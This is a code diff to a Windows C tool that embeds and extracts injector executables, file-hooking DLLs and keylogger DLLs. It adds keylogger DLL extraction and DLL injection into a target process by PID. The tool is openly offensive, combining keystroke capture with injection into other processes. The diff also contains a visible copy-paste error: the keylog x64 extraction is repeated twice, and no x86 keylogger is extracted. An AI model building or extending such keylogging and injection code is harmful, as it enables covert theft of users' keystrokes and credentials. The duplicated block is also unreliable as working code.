@@ -16,11 +16,17 @@ extern const char binary_bin_injector_x86_exe_end[];
 extern const char binary_bin_injector_x64_exe_start[];
 extern const char binary_bin_injector_x64_exe_end[];
 
-extern const char binary_bin_hooknt_x64_dll_start[];
-extern const char binary_bin_hooknt_x64_dll_end[];
+extern const char binary_bin_createfile_x64_dll_start[];
+extern const char binary_bin_createfile_x64_dll_end[];
 
-extern const char binary_bin_hooknt_x86_dll_start[];
-extern const char binary_bin_hooknt_x86_dll_end[];
+extern const char binary_bin_createfile_x86_dll_start[];
+extern const char binary_bin_createfile_x86_dll_end[];
+
+extern const char binary_bin_keylog_x64_dll_start[];
+extern const char binary_bin_keylog_x64_dll_end[];
+
+extern const char binary_bin_keylog_x86_dll_start[];
+extern const char binary_bin_keylog_x86_dll_end[];
 #endif
 #ifdef __x86_64__
 extern const char _binary_bin_reader_exe_start[];
@@ -32,11 +38,17 @@ extern const char _binary_bin_injector_x86_exe_end[];
 extern const char _binary_bin_injector_x64_exe_start[];
 extern const char _binary_bin_injector_x64_exe_end[];
 
-extern const char _binary_bin_hooknt_x64_dll_start[];
-extern const char _binary_bin_hooknt_x64_dll_end[];
+extern const char _binary_bin_createfile_x64_dll_start[];
+extern const char _binary_bin_createfile_x64_dll_end[];
 
-extern const char _binary_bin_hooknt_x86_dll_start[];
-extern const char _binary_bin_hooknt_x86_dll_end[];
+extern const char _binary_bin_createfile_x86_dll_start[];
+extern const char _binary_bin_createfile_x86_dll_end[];
+
+extern const char _binary_bin_keylog_x64_dll_start[];
+extern const char _binary_bin_keylog_x64_dll_end[];
+
+extern const char _binary_bin_keylog_x86_dll_start[];
+extern const char _binary_bin_keylog_x86_dll_end[];
 #endif
 
 typedef BOOL(WINAPI *IsWow64Process2_t)(
@@ -79,14 +91,24 @@ BOOL ExtractEmbedded(void)
     if (!ExtractEmbeddedFile("injector.x64.exe", binaryData, fileSize))
         areExtracted = FALSE;
 
-    binaryData = binary_bin_hooknt_x86_dll_start;
-    fileSize = binary_bin_hooknt_x86_dll_end - binary_bin_hooknt_x86_dll_start;
-    if (!ExtractEmbeddedFile("hooknt.x86.dll", binaryData, fileSize))
+    binaryData = binary_bin_createfile_x86_dll_start;
+    fileSize = binary_bin_createfile_x86_dll_end - binary_bin_createfile_x86_dll_start;
+    if (!ExtractEmbeddedFile("createfile.x86.dll", binaryData, fileSize))
         areExtracted = FALSE;
 
-    binaryData = binary_bin_hooknt_x64_dll_start;
-    fileSize = binary_bin_hooknt_x64_dll_end - binary_bin_hooknt_x64_dll_start;
-    if (!ExtractEmbeddedFile("hooknt.x64.dll", binaryData, fileSize))
+    binaryData = binary_bin_createfile_x64_dll_start;
+    fileSize = binary_bin_createfile_x64_dll_end - binary_bin_createfile_x64_dll_start;
+    if (!ExtractEmbeddedFile("createfile.x64.dll", binaryData, fileSize))
+        areExtracted = FALSE;
+
+    binaryData = binary_bin_keylog_x64_dll_start;
+    fileSize = binary_bin_keylog_x64_dll_end - binary_bin_keylog_x64_dll_start;
+    if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
+        areExtracted = FALSE;
+
+    binaryData = binary_bin_keylog_x64_dll_start;
+    fileSize = binary_bin_keylog_x64_dll_end - binary_bin_keylog_x64_dll_start;
+    if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
         areExtracted = FALSE;
 #endif
 #ifdef __x86_64__
@@ -105,14 +127,24 @@ BOOL ExtractEmbedded(void)
     if (!ExtractEmbeddedFile("injector.x64.exe", binaryData, fileSize))
         areExtracted = FALSE;
 
-    binaryData = _binary_bin_hooknt_x86_dll_start;
-    fileSize = _binary_bin_hooknt_x86_dll_end - _binary_bin_hooknt_x86_dll_start;
-    if (!ExtractEmbeddedFile("hooknt.x86.dll", binaryData, fileSize))
+    binaryData = _binary_bin_createfile_x86_dll_start;
+    fileSize = _binary_bin_createfile_x86_dll_end - _binary_bin_createfile_x86_dll_start;
+    if (!ExtractEmbeddedFile("createfile.x86.dll", binaryData, fileSize))
         areExtracted = FALSE;
 
-    binaryData = _binary_bin_hooknt_x64_dll_start;
-    fileSize = _binary_bin_hooknt_x64_dll_end - _binary_bin_hooknt_x64_dll_start;
-    if (!ExtractEmbeddedFile("hooknt.x64.dll", binaryData, fileSize))
+    binaryData = _binary_bin_createfile_x64_dll_start;
+    fileSize = _binary_bin_createfile_x64_dll_end - _binary_bin_createfile_x64_dll_start;
+    if (!ExtractEmbeddedFile("createfile.x64.dll", binaryData, fileSize))
+        areExtracted = FALSE;
+    
+    binaryData = _binary_bin_keylog_x64_dll_start;
+    fileSize = _binary_bin_keylog_x64_dll_end - _binary_bin_keylog_x64_dll_start;
+    if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
+        areExtracted = FALSE;
+
+    binaryData = _binary_bin_keylog_x64_dll_start;
+    fileSize = _binary_bin_keylog_x64_dll_end - _binary_bin_keylog_x64_dll_start;
+    if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
         areExtracted = FALSE;
 #endif
     return areExtracted;
@@ -520,6 +552,7 @@ static void PrintKey(BYTE pKey)
 BOOL CommandKeylog()
 {
     Sleep(150);
+    wprintf(L"[+] Starting keylog routine...\n");
     while(1)
     {
         Sleep(40);
@@ -546,11 +579,24 @@ BOOL CommandExtract()
 
 BOOL CommandInject(WCHAR* process, WCHAR* dllPath)
 {
+    DWORD pid = _wtoi(process);
+    if(pid != 0)
+    {        
+        CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
+        wprintf(L"[*] Trying to inject into specified PID %lu\n", pid);
+        if(!StartInjectionProcess(pid, dllPath))
+        {
+            wprintf(L"[-] Unable to inject into specified PID %lu\n", pid);
+            return FALSE;
+        }
+        fflush(stdout);
+        return TRUE;
+    }
+
     DWORD *processIds = NULL;
     DWORD count = 0;
 
     GetProcessIdsFromFilename(process, &processIds, &count);
-
     if (count == 0)
     {
         wprintf(L"[!] Error: No processes with filename \"%ls\" found.\n", process);
@@ -708,25 +754,25 @@ int wmain(int argc, wchar_t *argv[])
     BOOL loop = TRUE;
 
     // Get the console window handle
-    HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
+    //HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
 
     // Get console screen buffer info
-    CONSOLE_SCREEN_BUFFER_INFO cBufferInfo = {0};
-    GetConsoleScreenBufferInfo(consoleHandle, &cBufferInfo);
+    //CONSOLE_SCREEN_BUFFER_INFO cBufferInfo = {0};
+    //GetConsoleScreenBufferInfo(consoleHandle, &cBufferInfo);
     
     Sleep(100);
     wprintf(L"[!] press \"x\" to exit, other key to continue...\n");
 
     // Calculate the bottom row position
-    DWORD botRow = cBufferInfo.srWindow.Bottom;
+    //DWORD botRow = cBufferInfo.srWindow.Bottom;
 
     while(loop)
     {
         // Set the cursor position to the bottom row
-        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), (COORD){0, botRow});
+        //SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), (COORD){0, botRow});
 
         // Print a message on the bottom row
-        wprintf(L"> ");
+        //wprintf(L"> ");
         wscanf(L"%ls", readAction);
         if(wcscmp(readAction, L"x") == 0) loop = FALSE;
         
